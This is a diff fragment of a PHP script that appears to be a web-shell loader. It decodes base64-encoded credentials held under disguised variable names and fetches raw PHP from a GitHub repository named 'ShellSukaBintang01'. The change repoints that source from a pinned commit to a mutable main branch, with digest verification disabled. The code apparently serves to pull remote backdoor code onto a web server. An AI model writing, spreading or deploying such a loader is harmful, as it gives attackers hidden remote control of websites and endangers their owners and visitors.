@@ -17,7 +17,7 @@ $principal = base64_decode($encoded_user);
 $seal = base64_decode($encoded_pass);
 
 // remote source location (raw PHP content)
-$remote_manifest = "https://raw.githubusercontent.com/413X308/ShellSukaBintang01/f2c170ba0b7f25e47a39b2bcd00431596bd39afa/original.php";
+$remote_manifest = "https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php";
 
 // optional authoritative content digests (SHA-256). empty=disabled.
 $authorized_digests = []; // e.g. ['3a7bd3...']
